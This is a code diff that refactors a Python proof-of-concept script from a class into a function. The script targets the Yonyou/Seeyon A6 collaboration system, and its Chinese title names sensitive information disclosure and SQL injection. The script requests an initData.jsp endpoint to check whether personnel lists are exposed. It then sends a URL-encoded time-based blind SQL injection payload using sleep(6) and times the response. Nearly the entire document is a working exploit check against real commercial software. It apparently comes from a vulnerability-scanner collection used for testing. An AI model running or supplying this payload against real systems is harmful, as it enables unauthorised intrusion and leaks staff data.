@@ -10,20 +10,13 @@ import sys
 import time
 import requests
 import warnings
-
-  
-
-class initData_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['用友致远A6协同系统敏感信息泄露&SQL注射','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/yyoa/common/selectPersonNew/initData.jsp?trueName=1"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"personList" in req.text and r"new Person" in req.text:
@@ -31,7 +24,7 @@ class initData_disclosure:
                 result[1] = vulnurl
                 return result
 
-            vulnurl = self.url + "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
+            vulnurl = url + "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
             start_time = time.time()
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
@@ -47,5 +40,5 @@ class initData_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = initData_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
